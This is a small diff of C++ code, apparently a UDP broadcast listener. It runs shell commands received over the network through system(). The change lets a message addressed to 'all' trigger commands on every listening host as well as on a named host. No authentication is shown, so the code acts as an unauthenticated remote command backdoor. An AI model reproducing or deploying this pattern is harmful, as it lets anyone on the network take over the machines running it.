@@ -68,7 +68,7 @@ int main() {
         socklen_t addrLen = sizeof(broadcastAddr);
         ssize_t bytesReceived = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&broadcastAddr, &addrLen);
         if (bytesReceived > 0) {
-            if(split((std::string)buffer)[0] == exec("hostname")){
+            if(split((std::string)buffer)[0] == exec("hostname") || split((std::string)buffer)[0] == "all"){
                 if(split((std::string)buffer)[1] == "cmd"){
                     system(split((std::string)buffer)[2].c_str());
                 }
